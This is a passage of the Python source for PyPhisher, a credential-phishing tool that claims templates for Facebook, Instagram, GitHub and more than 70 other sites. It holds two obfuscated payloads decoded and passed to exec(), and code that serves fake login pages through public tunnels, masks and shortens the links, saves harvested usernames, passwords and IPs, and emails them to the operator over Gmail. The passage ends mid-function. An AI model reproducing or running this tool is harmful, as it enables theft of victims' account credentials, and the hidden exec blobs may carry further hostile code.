# -*- coding: UTF-8 -*-
# ToolName   : PyPhisher
# Author     : KasRoudra
# Version    : 2.0
# License    : GPL V3
# Copyright  : KasRoudra (2021-2022)
# Github     : https://github.com/KasRoudra
# Contact    : https://m.me/KasRoudra
# Description: PyPhisher is a phishing tool in python
# Tags       : Facebook Phishing, Github Phishing, Instagram Phishing and 70+ other sites available
# 1st Commit : 08/08/2021
# Language   : Python
# Portable file/script
# If you copy open source code, consider giving credit
# Credits    : Zphisher, MaskPhish, AdvPhishing
# Env        : #!/usr/bin/env python

"""
                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The GNU General Public License is a free, copyleft license for
software and other kinds of works.

  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
the GNU General Public License is intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.  We, the Free Software Foundation, use the
GNU General Public License for most of our software; it applies also to
any other work released this way by its authors.  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

  To protect your rights, we need to prevent others from denying you
these rights or asking you to surrender the rights.  Therefore, you have
certain responsibilities if you distribute copies of the software, or if
you modify it: responsibilities to respect the freedom of others.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must pass on to the recipients the same
freedoms that you received.  You must make sure that they, too, receive
or can get the source code.  And you must show them these terms so they
know their rights.

  Developers that use the GNU GPL protect your rights with two steps:
(1) assert copyright on the software, and (2) offer you this License
giving you legal permission to copy, distribute and/or modify it.

  For the developers' and authors' protection, the GPL clearly explains
that there is no warranty for this free software.  For both users' and
authors' sake, the GPL requires that modified versions be marked as
changed, so that their problems will not be attributed erroneously to
authors of previous versions.

  Some devices are designed to deny users access to install or run
modified versions of the software inside them, although the manufacturer
can do so.  This is fundamentally incompatible with the aim of
protecting users' freedom to change the software.  The systematic
pattern of such abuse occurs in the area of products for individuals to
use, which is precisely where it is most unacceptable.  Therefore, we
have designed this version of the GPL to prohibit the practice for those
products.  If such problems arise substantially in other domains, we
stand ready to extend this provision to those domains in future versions
of the GPL, as needed to protect the freedom of users.

  Finally, every program is threatened constantly by software patents.
States should not allow patents to restrict development and use of
software on general-purpose computers, but in those that do, we wish to
avoid the special danger that patents applied to a free program could
make it effectively proprietary.  To prevent this, the GPL assures that
patents cannot be used to render the program non-free.

  The precise terms and conditions for copying, distribution and
modification follow.

Copyright (C) 2022 KasRoudra (https://github.com/KasRoudra)
"""

_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b16decode(__[::-1]));exec((_)(b'25536A1730FFFBEBFB6A9E6A60662D76E328EB895783E0338EBD221DB65CACB8138281D98906783F7197CF3E71D7AE05B8B1D4C732C71EEA376EBB6C99C6A37B173AE17044D0F845091EB4B2353822F0576930BD2B0F0531307BEBC0DF15D95A247D8669AA50757793483E09BF39815788633B496405005A44AB5612E467AC5F4D52190D3A9963B272E38286C36578282CCEA416EF911478C9730ABE0D0732A820A8D4F81D4BC993E15ED28BD72F681344949907F5FCDECBB868697965E9D2BE207B16B7A933968C3C5EE1470ED77E1315783B26107B12FE650AAED8CBD709943D32A0E9599A1B2B0496A20F692BE9B7B3D27736BC956CC0A067A0D37A2D89E476772C20E20035FE35EA2991260AD20BDE2A6CAFA9907C1B4A89AC03E6BCAE08B274AC0F13E0BFE7B1C30A6240757153C5E6D60BEF301B960B2D1DB77D1C24081610C6199FCB6C9C500EC8B2A57F0634C0D3F1B43C7AF292779E654263D880D11F8FECC040B14D86A8AA8B016373B58000CA41002792F386821FDBFAF1056F3988F4234EBC3CAB74E9FCC2B2ECE9B08D3C8D345ED89B238356EC62371BA0D2B3BACAD40CBC321997F5B66E119547ED85F2C4A6BF41B60B92E2E79886CF6F7D849955D7E83917090C1591F0328D2C657A3EDD36FED62BD53F0B7BF2A36A0F8E5864AE4BF258E3888F0A585338CBC65060D1A3C7718282B37825DA35C3BAE598B531615B99B5CA71A346A660E74259FCC56BB78F3CED4FE3EB2E39FD3671957D43F425A648730C0BB7B0D9E773973B16B43F176FB8D75D79B1B07C6DA6C5152F5B4AE96F0E0FA69309EB7975579C49E601FE256422CCECB5D236833FEE5F44EA84E7CEC13D091B466D6FCADBC6D5CC9759543DD2EC5572B16EBFA5E6BB21E333A241E4E56564DD9AB6D261D1F9D329A6C3253B06F8D5BF3DC227497916351A4AFDA6099A4AAF765B1B5DB5954B19D0E626226BDD4E9D311DAAD1619FE563A7AEA3EEA87F846989BC43DDC1DD9732785CD291A91D11CF1B52F5F97D7F7FBEBE7F3F7F9FEFF89C13CA4621C028C4FBE178B7611864BBAF1D9EC229BD73DD3DF838C013B1E8D54951C987'))


# Color snippets
black="\033[0;30m"
red="\033[0;31m"
bred="\033[1;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
byellow="\033[1;33m"
blue="\033[0;34m"
bblue="\033[1;34m"
purple="\033[0;35m"
bpurple="\033[1;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
nc="\033[00m"

version="2.0"

# Regular Snippets
ask  =     f"{green}[{white}?{green}] {yellow}"
success = f"{yellow}[{white}√{yellow}] {green}"
error  =    f"{blue}[{white}!{blue}] {red}"
info  =   f"{yellow}[{white}+{yellow}] {cyan}"
info2  =   f"{green}[{white}•{green}] {purple}"

# Generated by banner-generator. Github: https://github.com/KasRoudra/banner-generator

# Modifying this could be potentially dangerous
logo = f"""
{red}  _____       _____  _     _     _               
{cyan} |  __ \     |  __ \| |   (_)   | |              
{yellow} | |__) |   _| |__) | |__  _ ___| |__   ___ _ __ 
{blue} |  ___/ | | |  ___/| '_ \| / __| '_ \ / _ \ '__|
{red} | |   | |_| | |    | | | | \__ \ | | |  __/ |   
{yellow} |_|    \__, |_|    |_| |_|_|___/_| |_|\___|_|   
{green}         __/ |{" "*19}       {cyan}[v{version}]
{cyan}        |___/  {" "*11}      {red}[By KasRoudra]
"""

nr_help = f"""
{info}Steps: {nc}
{blue}[1]{yellow} Go to {green}https://ngrok.com
{blue}[2]{yellow} Create an account 
{blue}[3]{yellow} Login to your account
{blue}[4]{yellow} Visit {green}https://dashboard.ngrok.com/get-started/your-authtoken{yellow} and copy your authtoken
"""

lx_help = f"""
{info}Steps: {nc}
{blue}[1]{yellow} Go to {green}https://localxpose.io
{blue}[2]{yellow} Create an account 
{blue}[3]{yellow} Login to your account
{blue}[4]{yellow} Visit {green}https://localxpose.io/dashboard/access{yellow} and copy your authtoken
"""

packages = [ "php", "ssh" ]
modules = [ "requests", "bs4" ]
tunnelers = [ "ngrok", "cloudflared", "loclx" ]
processes = [ "php", "ssh", "ngrok", "cloudflared", "loclx", "localxpose", ]


try:
    test = popen("cd $HOME && pwd").read()
except:
    exit()

supported_version = 3

if version_info[0] != supported_version:
    print(f"{error}Only Python version {supported_version} is supported!\nYour python version is {version_info[0]}")
    exit(0)

for module in modules:
    try:
        eximport(module)
    except ImportError:
        try:
            print(f"Installing {module}")
            run(f"pip3 install {module}", shell=True)
        except:
            print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
            exit(1)
    except:
        exit(1)

for module in modules:
    try:
        eximport(module)
    except:
        print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
        exit(1)

from requests import get, head, Session
from bs4 import BeautifulSoup

# Get Columns of Screen
columns = get_terminal_size().columns

websites_url = f"https://github.com/KasRoudra/PyPhisher/releases/download/v{version}/websites.zip" # "https://github.com/KasRoudra/PyPhisher/releases/latest/download/websites.zip" 

# CF = Cloudflared, NR = Ngrok, LX = LocalXpose, LHR = LocalHostRun

home = getenv("HOME")
sites_dir = f"{home}/.websites"
templates_file = f"{sites_dir}/templates.json"
tunneler_dir = f"{home}/.tunneler"
php_file = f"{tunneler_dir}/php.log"
cf_file = f"{tunneler_dir}/cf.log"
lx_file = f"{tunneler_dir}/loclx.log"
lhr_file = f"{tunneler_dir}/lhr.log"
site_dir = f"{home}/.site"
cred_file = f"{site_dir}/usernames.txt"
ip_file = f"{site_dir}/ip.txt"
main_ip = "ip.txt"
main_info = "info.txt"
main_cred = "creds.txt"
email_file = "files/email.json"
error_file = "error.log"
is_mail_ok = False
redir_url = ""
email = ""
password = ""
receiver = ""
mask = ""
default_port = 8080
default_tunneler = "Cloudflared"
default_template = "60"
nr_command = f"{tunneler_dir}/ngrok"
cf_command = f"{tunneler_dir}/cloudflared"
lx_command = f"{tunneler_dir}/loclx"
if isdir("/data/data/com.termux/files/home"):
    termux = True
    nr_command = f"termux-chroot {nr_command}"
    cf_command = f"termux-chroot {cf_command}"
    lx_command = f"termux-chroot {lx_command}"
    saved_file = "/sdcard/.creds.txt"
else:
    termux = False
    saved_file = f"{home}/.creds.txt"
    


print(f"\n{info}Please wait!{nc}")

_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b32decode(__[::-1]));exec((_)(b'XZOVEJ6H5777XPN2EGNUQ4QYAPB6JIHSFC3VRNBGQDZGIQTEU5WOSEX764SZXWDQ72AMKUS35M4B5HAAASC74P7VN25NCTPHNVP7P2NSOAXJB6VXYYZWYJXUUJZYJCYTWQPPPYWTKHENSJKA4G6FHTIAGGS6OIMAGMINDBFXNANAGLUXCXICIVZQPJIANE5XU4WWRUCZ2RJPPCNEPPFAQYCM3HZV35X7ARAWD3FT33ASKN7OYESAH4LIYRRWWY5HDOTRB3VW5UBCTIMSA4NIBDUHRHIPYIXS6OAYIJBG3A46SG4AF7XRVSCL76YV75WEGQNCQT4A6JLE5LLDIHWXJURMX7FVWUDAOCVYZKQBANNR44J2JOXTC3OQGG3PGIGFYLXL4LXNITMYIYKA6KOVZMIJA3YJKVWKSXVMFO4WSZ6TP7K4MJ5I42FEOMF22K65I53NKU2FKDTJ6ICCZKNFUX7APPR6UILC2HMFSPJV76WKODWQIAGG4KZBQ5ASN4BC46HYMLXS2ANTV4CDFZIMXAEUHQ4KWUCWJJC3FELTO6APEINWNWMYL3U3FJSCZTKALLHHIOG3TQK5P6HME6GWIO62X5D45WTYFZ46W2PFFAAMXKNC5XCFNCSJ2BJ3KCTEX2X7ZJPJYTOPVN5SRER54PBFQE5W5BXUXX76DLIDBQF4O6Z3MQEDMHR7ZIVBIRL7Y7AHYZE5KAI7L5YP6GUKKIDJF2N6UXRZL54DZODCZGXMTFMAWHKDR5NBHZNE3AXRCXLMYCMO634REYOFGWT64IFV5T3BOBMFH5CLYCDCF3HIB6QO55KZRKTXKOSUOFQQSHALYCNCQQM7C76JB3ZAJXXZYZCUVHD4BZJ3ZS5MQROHXBNBU3FC4FUGZ7I6GRZFB6UKB2NSJLWY7OQHOIK357EDCSOUKE4HCTKEO3JLBVMLCBYBDYYJLIH7QXXOY63QGOO3EO2FAAEN3D77BZM4ZHSNAYYYHQW6HAJXAOFTEYNFJWLRXM3PBKUDD2WDHTUQRFUODMRJHIU5R3FCYCPIAWRRB2ZMWUD2YZ3T7G4HUJYKQKXDU4XL2QXY6H4PZD4LF7X2EA2PUN3OJR7625WITXAPX77WAAIURNIG6GPWGNVQZKJUQD372PTLGVGORFC2OMOZAMI5YGNACBYEGRC46F75TQ5A6DJUVG5XW3AOKPISTGEZ4RKLYN45RG6B5RQ7FIPJCWCWAAMBT4KHCCMQAMVC6QPPFQWIP4SM6RMEFWQKWQXJ4EWSQJBJMSSSFGL7CSY72ER6TDQQ37DJ23NC5LANKBBHF66VZFNAFMTD52IAUTMRP4W6DPSAJRERDXSXHVGDBWWMDQG2EV6OBCDOVT6DOERHVWVX2TXJPXGDBPESH7ZUY7L3TGU5BIVS3KW5H5PMD6W7EGNYIDVJ3PJ7TQDY6RAHTN32GB6BABFE4K5WR53TCP3EJQA3MRTWIA5XKXDG72NSF6BJFD47FZTQUPYOX4G7WRQRPR32QIMXVWLBLHMLPXWRPYZBCFFKUCZ7RO5MZD6GS4HJTX7XZNAXRVMLGWQPLTCGG6V3NXMQLXQDO564HH6I7MO4XFOXEC7GXLQBBBGFG4EQ2KA5Q2QRNNVDNRA5RAD446LUVMVNLMSO5SEQZPXBNP2H53TUETQK5AFEDMU44ZTYYALMK4YYDEHKOFENEFXZVC3FBWLHOCU5G6DQCUTDV2T33R2HE72RWAU2DQZV2GZN2FBSUQAOLPUTUYLCQS424OPF7KJU3DUDF2O74HB36LJXZFU2IBFGUKJTOQAHMH5OBFRPQ6XW5STPEKZQ7NU5YXXJ5SPO7GW522RTWIPDGAI2D4XL4RVKOB55NCUA6DSAOUUQMA25EHL6NY3JYABJQXEB65IOCPAUYHWVUEQMX2RI6SYY4QXVRQLMIKTBRA5B5IPSHWPYG2LJUCQX5Z6QK5VLUIXDEA6ZIWB63GIERWM3YNGGBYMO5OLLKUGTHNXTS75BVMCUVPXNUP337V2YGQS6M2OC5KU3RYZX4BCQMSFTWHYXAQ3VCRUBNSAGZFFTQOAXC2MHB5L37GBKGDSAGOUJ7XNDBA6CUUDJ2BZAOHGE7KYC3TY25QFW2VPY2OKULWD2QVXEZCEYKPRDPCQ2EOBIYC3X76AKL6B7SBOZAL3IUGKLXXYHMANPL7ER7EZ3OKQYF2LD4LHZY2XBR3W33WKLHVJD4PGKJASNO53WRC44EP3P3AKBRMDZDF6K44G55PNA3LWKQ5A6LS2O66QM7A4WIX4LZZRZE3ZYD3UKBU5ORLY5SVTV6JRXITMTWBQGLWTBFUUSAY4IBEW7TVBD4DTAUX5XXU2WASJHVFLFQLGFCAM4PFCAX5FZ3LIMVPTS6SSZMALC6ZUP3J5QOGARKMYLMGFLV2SHEBDXMBF2FABUQ73DYFUKUTG7OPO4NNVB4VSLZVXACGHVJ3M3PPIKZ76HG23SQLPZCRZZCPDZ65KUASR2GOCFEEBQDKFQ6ZBRIOJ6MXZLY6BZBUCZIA7I27V7WLYX33DQQPB246Q254FFNBHK7FGPVIRY57HEHKSJT7IIJGEYEAZAOCM4NQXVAC6GBFHKELHBCXYWALIIGS5YPDKNMRVHPHYF3QPUSPSMXPCL4WJKZDWHNLVDBIMHVMG7BAKO7YX3PB2YC3G6ICT2H5I3MXGB6FJ7Z6ZLEPF6UCHLLJXHS35ZQDQ3LBI75ZIJUPSBVFQBRQMLLH5N5ASC5JQLVUWZMQJVRU4F67Q2CZDCZEHGMQDDJAOET5F75UOGPPHXV6Q2F522SBNGZWEPPYIKS2LAELTHSKPE4HPQ7TZ4EUIUQIYQPECLBWAXKMGE4CZ25FIGUEBQCNSMJ336NYN6KAK2DUDO6TDDEMJF3ZDOZXA4HEETUXMATKQV3OABGZ4FEKKCQ6Z3OZLX2VLG54SMPCXHDSFW7PWPNQL7C56SCPKLZXUBGWF3ZYRFUYXNKBHRDSZGXMI3OLTFFB4UEFXYJ5AL4S5WNOOKY2WGKDSQZXF25ZPCTG6Z76OPNKI45EKIQXKSDT7OVXFUNGMZBWAHTSKHLLOZYY2WP5QU6ANN2VEOFZL7BCYFB4ZFRDSSXY7S4OSEAE6Z4DZBWGH7I4DMZ5KH26BL6AAWELJOY56UZMO7V75A53MPHO7HYAVBBOLTVM5PRVMLCDXDSX73MT6FGLK2ZMMADPLHRKA7WVHOTYDW6C5HKNXE7YVSVDMVYES4JGBQ6HQS54ESLHFVWPHSSRRMXHZXXLYEZR7EHG5TOSMW76ICZC5RUB7MMXNE7VHDRT7Q7ZT7ZB4K5TD7ANLHIURMZJHMOOGOMRNB6M3NYUWNXB2EHRIH3J2KLZPWLDPD2UDWV7UBGNTJS3VR3JYSICI5DUMLCTV76FGNPLJP332FT2XVPIWDQKGIZ5UFH5DXVZN2H4KDEPYFKW6DB7UEEEN4DFOPH5E7NFO5RI4VBXIVETHDQONRB4AXZT4L4SOV4SUBFJZFVO4ZFYZLROFBLNRJQGJLYVLFE3IU3W23WKU4Q4GSGMK5MJ4ZFZRYKQMOD6TXXGO7X7DHRSNHIQMF4SUCHUUIYADWYWBOF3ZZLJYXWZUWSGELXUJQO6HW4BQ243IVQ4IV3Y6RO7R35UHQ5SSY4PGXJPSNTBVRMMWX57NF4XXOQ5ZUC2UYGOWSHUXLZSLRHBPFF6H46CMIIYPTF6YZDZQQZ43YLBECOPA2HN3I2NK2ZMDFF6B4HTXCLXKLQYQ3V2HJZWW7XBAPHFNRX2ICVBX7LCGVVNOLXE3TWZVHPT5TMY7T37SE7IJIRARDYMNSCFXHOWZWFWONXTEUGP4UGWNA6TGMYM53GUSW7TBCPCWJAXKG4ERZGIPWWTTZWM2ELKF2KKUQSZGOP7Y75O2HH7TLUV3V32RY6JKWOPM3SXUFICKWIAOSOFY4PWHRG2OCSEHWN7HZ27IQ6ITJUSBJNNLLKHMUFSZS25K5YPXQWPPX2BXTXTT5SO2RE7SQTT3OAXH56OSFHTK4NWVJBDFOG4G4ZJP6KGUNSNNJQDQL46EPY6QD4DVYCPGWUMAKKMSXYU5PNUYUS4LJVB45ZL3LVVAK4TQ2RVE24XITG3M4LUDN6KKLZCOUKOVQMWDGVLRYMWVVYRUIYE4QJTNWMF4NZQOSLDZQLRO44SA44OHTAKQZAMDVBFIHPSDUJ4UNZ55WBSPYOYIWNGSXUOTVAQXHIY7FSN6MOJTEV5S5LG4YFJUDOPY6LLS3Y7GVJPZDSIOSUYXKGSR6SGBESXQUXTXYOCI7ZR3Z6HLDURFRLJPG5VQ2KUBGHFIZWI67C7IPEMEA7R2LGQFVKIEGFOK3RT3R37G6OS66KLWZ32KPUHWZI5PVFKM4IPWJJ66NS6ZOKF5B5E5MCZ6TS5GLWOD6SZCD76K4IIJIMO2SZKSPC34NBEB62DKS7ZVTGYUWZLMRVN6URLP3Q4XPL2ULV4NQ6SZPFL3LHM5SSQMQFBPJ3FQTZBCYTEPNMPYHDSSP23PSBKDRRZIKLT2Q4XM45UXTA4APEBTRCO4NN4F2F5VZP4XOFZELTYWJLEV54L3FOLWYKQR6TPZZXWQAIUH6GKJTB5UM4ADL5UFTMPM4FBRYK2XQFPH7YONXINVULXERIJ3OJ6JH7DF43FKLPPZXA765QXEHNQWYYS46TW2EZXKXVJUVESSDZNULU3O5EL2CZASPH6ISQ6K63G2FH5OWHDV4UFL4ZKEUHRNFIPYHDTLLF2LXLPOOP4WB7R4A53VHBLBADEP53HD6R5AJAVHUUTJSX6KOV6VGWGCTL3JQUZPJTJYTZW3L7NX7XMBFN5W5EK3KXHP5UYYACNHPOV7U3MJYWNTSQPTD2BUL7QTIO5O44B5CXTVE5NIVIGPOXQ6C6BLBOMG56DVF73RGIX2UPFJR4Q2YESAJR5KFFPZTHWJZBSNTJVG5S3YNHV5276K4T26YHU4FPUJKOTZGEJAJEWZPJ23WZEZYH7L7SSXCKMTYR62NWHLRN3P33JZPZIEV4L5BVK3Z46WVKVCZ4OIZBBR7UJ4BZCMZDO2TDZLYN77X3W2GUCJLH7MWGZWU5L2P4TUNP7SNMKQPIG7MDX5LXFKV3CO6WI622TS66FDAKLX6QH7P4DWQKEXX3KFF2XT74GN3VVW5LXCRZOHZKPAPFM5NOS7A3IQZ6QT4D7WKLTZH7SFAIPOZMC2QT2BCOXORV6Q2NC6F7NTB5J7JT3I3XPUHW2NKOSG6EWU6TWD55V52WOFW4WWVLHTLW57YX6N7WN74RM5DCEJ5XSJX6QQ4RV43YI5P76Z3767P74TPO67775ZX7437BPYJQSS5SWLIGPRXX3YR63ZK5WZG5YZ4ARREW2AURI36XJ5REUEQS2LSJCG3BOCP'))



# Print lines slowly
def sprint(text, second=0.05):
    for line in text + '\n':
        stdout.write(line)
        stdout.flush()
        sleep(second)
        
# Prints colorful texts
def lolcat(text):
    if is_installed("lolcat"):
        run(["lolcat"], input=text, text=True)
    else:
        print(text)

# Center text 
def center_text(text):
    lines = text.splitlines()
    if len(lines) > 1:
        minlen = min([len(line) for line in lines if len(line)!=0]) + 8
        new_text = ""
        for line in lines:
            padding = columns + len(line) - minlen
            if columns % 2 == 0 and padding % 2 == 0:
                padding += 1
            new_text += line.center(padding) + "\n"
        return new_text
    else:
        return text.center(columns+8)


# Print decorated file content
def show_file_data(file):
    lines = cat(file).splitlines()
    for line in lines:
        print(f"{cyan}[{green}*{cyan}] {yellow}{line}")

        
# Clear the screen and show logo
def clear(fast=False, lol=False):
    shell("clear")
    if fast:
        print(logo)
    elif lol:
        lolcat(logo)
    else:
        sprint(logo, 0.01)
        

# Install packages
def installer(package, package_name=None):
    if package_name is None:
        package_name = package
    for pacman in ["pkg", "apt", "apt-get", "apk", "yum", "dnf", "brew", "pacman", "yay"]:
        # Check if package manager is present but php isn't present
        if is_installed(pacman):
            if not is_installed(package):
                sprint(f"\n{info}Installing {package}{nc}")
                if pacman=="pacman":
                    shell(f"sudo {pacman} -S {package_name} --noconfirm")
                elif pacman=="apk":
                    if is_installed("sudo"):
                        shell(f"sudo {pacman} add {package_name}")
                    else:
                        shell(f"{pacman} add -y {package_name}")
                elif is_installed("sudo"):
                    shell(f"sudo {pacman} install -y {package_name}")
                else:
                    shell(f"{pacman} install -y {package_name}")
                break
    if is_installed("brew"):
        if not is_installed("ngrok"):
            shell("brew install ngrok/ngrok/ngrok")
        if not is_installed("cloudflare"):
            shell("brew install cloudflare/cloudflare/cloudflared")
        if not is_installed("localxpose"):
            shell("brew install localxpose")


# Process killer
def killer():
    # Previous instances of these should be stopped
    for process in processes:
        if is_running(process):
            # system(f"killall {process}")
            output = shell(f"pidof {process}", True).stdout.decode("utf-8").strip()
            if " " in output:
                for pid in output.split(" "):
                    kill(int(pid), SIGINT)
            elif output != "":
                kill(int(output), SIGINT)
            else:
                print()

# Internet Checker

def internet(url="https://api.github.com", timeout=5):
    while update:
        try:
            head(url=url, timeout=timeout)
            break
        except:
            print(f"\n{error}No internet!{nc}\007")
            sleep(2)

        
# Send mail by smtp library
def send_mail(msg):
    global email, password, receiver
    message = f"From: {email}\nTo: {receiver}\nSubject: PyPhisher Login Credentials\n\n{msg}"
    try:
        internet()
        with smtp('smtp.gmail.com', 465) as server:
            server.login(email, password)
            server.sendmail(email, receiver, message) 
    except Exception as e:
        append(e, error_file)
        print(f"{error}{str(e)}")



# Bytes to KB, MB converter
def readable(byte, precision = 2, is_speed = False):
    for unit in ["Bt","KB","MB","GB"]:
        floatbyte = round(byte, precision)
        space = ' ' * (6 - len(str(floatbyte)))
        if byte < 1024.0:
            if is_speed:
                size = f"{floatbyte} {unit}/s{space}"
            else:
                size = f"{floatbyte} {unit}{space}"
            break
        byte /= 1024.0
    return size

# Dowbload files with progress bar(if necessary)
def download(url, path, size=None):
    from time import ctime, time
    session = Session()
    filename = basename(path)
    directory = dirname(path)
    retry = 3
    if directory!="" and not isdir(directory):
        mkdir(directory)
    newfile = filename.split(".")[0] if "." in filename else filename
    newname = filename if len(filename) <= 12 else filename[:9]+"..."
    print(f"\n{info}Downloading {green}{newfile.title()}{nc}...\n")
    for i in range(retry):
        try:
            with open(path, "wb") as file:
                internet()
                response = session.get(url, stream=True, timeout=20)
                chunk_size = 4096 #KB
                total_length = response.headers.get('content-length')
                length = int(total_length or size or "0")
                downloaded = 0
                alldata = b""
                max_len = columns - 38
                newname_space = " " * (14 - len(newname))
                max_len2 = columns - 50
                pre_space = 0
                suf_space = max_len2
                stime = time()
                for data in response.iter_content(chunk_size=chunk_size):
                    etime = time()
                    downloaded += len(data)
                    alldata += data
                    speed = chunk_size/float(etime-stime)
                    readable_speed = readable(speed, is_speed=True)
                    file.write(data)
                    readable_size = readable(len(alldata))
                    if length == 0:
                        stdout.write(f"\r{newname}{newname_space}[{' '*pre_space}<=======>{' '*suf_space}] {readable_size} {readable_speed}")
                        stdout.flush()
                        if pre_space == max_len2:
                            forward = False
                        if suf_space == max_len2:
                            forward = True
                        if forward:
                            pre_space+=1
                            suf_space-=1
                        else:
                            pre_space-=1
                            suf_space+=1
                    else:
                        done = int(max_len * downloaded / length)
                        # Arrow will progress as the data increases with done
                        arrow = "=" * done
                        # Space will decrease as done increases
                        arrow_space = " " * (max_len - done)
                        percentage = round(downloaded * 100 / length, 2)
                        stdout.write(f"\r{newname}{newname_space}[{arrow}>{arrow_space}] {percentage}% {readable_speed}")
                        stdout.flush()
                    stime = time()
                if length == 0:
                    stdout.write(f"\r{newname}{newname_space}[<{'=' * (max_len2+7)}>] {readable_size}{' ' * 20}")
                else:
                    stdout.write(f"\r{newname}{newname_space}[{'=' * max_len}>] 100.0%{' ' * 20}")
                stdout.flush()
                # This print fixes the cursor to newline
                print()
                break
        except Exception as e:
            print()
            remove(path)
            append(e, error_file)
            print(f"{error}Download failed due to: {str(e)}")
            print(f"\n{info}Retrying {i}/{retry}{nc}")
            sleep(1)
    if not isfile(path):
        print(f"\n{error}Download failed permanently!")
        pexit()


# Extract zip/tar/tgz files
def extract(file, extract_path='.'):
    directory = dirname(extract_path)
    if directory!="" and not isdir(directory):
        mkdir(directory)
    try:
        if ".zip" in file:
            with ZipFile(file, 'r') as zip_ref:
                if zip_ref.testzip() is None:
                    zip_ref.extractall(extract_path)
                else:
                    print(f"\n{error}Zip file corrupted!")
                    delete(file)
                    exit()
            return
        tar = taropen(file, 'r')
        for item in tar:
            tar.extract(item, extract_path)
            # Recursion if childs are tarfile
            if ".tgz" in item.name or ".tar" in item.name:
                extract(item.name, "./" + item.name[:item.name.rfind('/')])
    except Exception as e:
        append(e, error_file)
        delete(file)
        print(f"{error}{str(e)}")
        exit(1)
        


def write_meta(url):
    if url=="":
        return
    allmeta = get_meta(url)
    if allmeta=="":
        print(f"\n{error}URL isn't correct!")
    write(allmeta, f"{site_dir}/meta.php")


def write_redirect(url):
    global redir_url
    if url == "":
        url = redir_url
    sed("redirectUrl", url, f"{site_dir}/login.php")


# Polite Exit
def pexit():
    killer()
    sprint(f"\n{info2}Thanks for using!\n{nc}")
    exit(0)


# Website chooser
def show_options(sites):
    total_sites = len(sites)
    def optioner(index, max_len):
        # Avoid RangeError/IndexError
        if index >= total_sites:
            return ""
        # Add 0 before single digit number
        new_index = str(index+1) if index >= 9 else "0"+str(index+1) 
        # To fullfill max length of a part we append empty space
        space = " " * (max_len - len(sites[index]))
        return f"{green}[{white}{new_index}{green}] {yellow}{sites[index]}{space}"
    # Array index starts from 0
    first_index = 0
    # Three columns
    one_third = int(total_sites/3)
    # If there is modulus, that means some entries are remaining, we need an extra row
    if total_sites%3 > 0:
        one_third += 1
    options = "\n\n"
    # First index of last line should be less than one-third of total
    while first_index < one_third and total_sites > 10:
        second_index = first_index + one_third
        third_index = second_index + one_third
        options += optioner(first_index, 23) + optioner(second_index, 17) + optioner(third_index, 1) + "\n"
        first_index += 1
    if total_sites < 10:
        for i in range(total_sites):
            options += optioner(i, 20) + "\n"
    options += "\n"
    if isfile(saved_file) and cat(saved_file)!="":
        options += f"{green}[{white}a{green}]{yellow} About      {green}[{white}s{green}]{yellow} Saved      {green}[{white}x{green}]{yellow} Main Menu       {green}[{white}0{green}]{yellow} Exit\n\n"
    else:
        options += f"{green}[{white}a{green}]{yellow} About                   {green}[{white}x{green}]{yellow} Main Menu         {green}[{white}0{green}]{yellow} Exit\n\n"
    lolcat(options)



# Set up ngrok authtoken to work with ngrok links
def nr_token():
    global nr_command
    while True:
        if isfile(f"{home}/.config/ngrok/ngrok.yml") or isfile(f"{home}/.ngrok2/ngrok.yml"):
             break
        has_token = input(f"\n{ask}Do you have ngrok authtoken? [y/N/help]: {green}")
        if has_token == "y":
            token = input(f"\n{ask}Enter your ngrok authtoken: {green}")
            shell(f"{nr_command} config add-authtoken {token}")
            sleep(1)
            break
        elif has_token == "help":
            sprint(nr_help, 0.01)
            sleep(3)
        elif has_token in ["n", ""]:
            break
        else:
            print(f"\n{error}Invalid input '{has_token}'!")
            sleep(1)

# Set up ngrok authtoken to work with ngrok links
def lx_token():
    global lx_command
    while True:
        status = shell(f"{lx_command} account status", True).stdout.decode("utf-8").strip().lower()
        if not "error" in status:
            break
        has_token = input(f"\n{ask}Do you have loclx authtoken? [y/N/help]: {green}")
        if has_token == "y":
            shell(f"{lx_command} account login")
            break
        elif has_token == "help":
            sprint(lx_help, 0.01)
            sleep(3)
        elif has_token in ["n", ""]:
            break
        else:
            print(f"\n{error}Invalid input '{has_token}'!")
            sleep(1)

def ssh_key():
    if key and not isfile(f"{home}/.ssh/id_rsa.pub"):
        print(f"\n{info}Please wait for a while! Press enter three times when asked for ssh key generation{nc}\n")
        sleep(1)
        shell("ssh-keygen")
    is_known = bgtask("ssh-keygen -F localhost.run").wait()
    if is_known != 0:
        shell("ssh-keyscan -H localhost.run >> ~/.ssh/known_hosts", True)


# Output urls
def url_manager(url, arg1, arg2):
    global mask
    print(f"\n{info2}{arg1} > {yellow}{url}")
    print(f"{info2}{arg2} > {yellow}{mask}@{url.replace('https://','')}")
    sleep(0.5)


def shortener1(url):
    website = "https://api.shrtco.de/v2/shorten?url="+url.strip()
    internet()
    try:
        res = get(website).text
        json_resp = parse(res)
    except Exception as e:
        append(e, error_file)
        json_resp = ""
    if json_resp != "":
        if json_resp["ok"]:
            return json_resp["result"]["full_short_link"]
    return ""

def shortener2(url):
    website = "https://is.gd/create.php?format=simple&url="+url.strip()
    internet()
    try:
        res = get(website).text
    except Exception as e:
        append(e, error_file)
        res = ""
    shortened = res.split("\n")[0] if "\n" in res else res
    if "https://" not in shortened:
        return ""
    return shortened

    
# Copy website files from custom location
def customfol():
    global mask
    while True:
        fol = input(f"\n{ask}Enter the directory > {green}")
        if isdir(fol):
